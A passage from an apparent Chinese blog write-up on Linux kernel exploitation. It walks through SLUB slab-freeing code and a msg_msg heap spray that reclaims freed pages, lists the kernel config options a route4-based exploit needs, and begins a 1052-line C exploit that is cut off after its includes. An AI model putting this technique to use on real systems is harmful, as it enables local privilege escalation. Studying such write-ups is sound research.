FREE_SLAB);</span><br><span class="line">discard_slab(s, page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里会验证数量是否满了，如果满了则会进入销毁流程调用<code>discard_slab</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">discard_slab</span><span class="params">(struct kmem_cache *s, struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">dec_slabs_node(s, page_to_nid(page), page-&gt;objects);</span><br><span class="line">free_slab(s, page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>discard_slab</code>函数首先做的事是修改一些数据上的内容随后接着调用<code>free_slab</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">free_slab</span><span class="params">(struct kmem_cache *s, struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (unlikely(s-&gt;flags &amp; SLAB_TYPESAFE_BY_RCU)) &#123;</span><br><span class="line">call_rcu(&amp;page-&gt;rcu_head, rcu_free_slab);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">__free_slab(s, page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __free_slab(struct kmem_cache *s, struct page *page)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> order = compound_order(page);</span><br><span class="line"><span class="keyword">int</span> pages = <span class="number">1</span> &lt;&lt; order;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmem_cache_debug_flags(s, SLAB_CONSISTENCY_CHECKS)) &#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line">slab_pad_check(s, page);</span><br><span class="line">for_each_object(p, s, page_address(page),</span><br><span class="line">page-&gt;objects)</span><br><span class="line">check_object(s, page, p, SLUB_RED_INACTIVE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__ClearPageSlabPfmemalloc(page);</span><br><span class="line">__ClearPageSlab(page);</span><br><span class="line"><span class="comment">/* In union with page-&gt;mapping where page allocator expects NULL */</span></span><br><span class="line">page-&gt;slab_cache = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;reclaim_state)</span><br><span class="line">current-&gt;reclaim_state-&gt;reclaimed_slab += pages;</span><br><span class="line">unaccount_slab_page(page, order, s);</span><br><span class="line">__free_pages(page, order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里做的事就是获得<code>page</code>的<code>order</code>去出<code>page-&gt;slab_cache</code>的指针，最后释放对应<code>page</code>。当释放<code>page</code>就好办了，可以大量堆喷<code>msg_msg</code>向<code>buddy system</code>申请page即可。</p><h3 id="综上，可得exp"><a href="#综上，可得exp" class="headerlink" title="综上，可得exp"></a>综上，可得exp</h3><p>可以预见的是，这一利用方法是不需要依赖任何地址的，但是这里想要跑通exp需要修改一下config文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_NET_CLS_ROUTE4=y</span><br><span class="line">CONFIG_DUMMY=y </span><br><span class="line">CONFIG_NET_SCH_QFQ=y </span><br><span class="line">CONFIG_NET_CLS_BASIC=y</span><br></pre></td></tr></table></figure><p>(有点不想写exp了，如果没删这句话那下面exp就是原文的，如果删了就是自己写的<del>好像删了你们也看不到</del>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;endian.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if_arp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 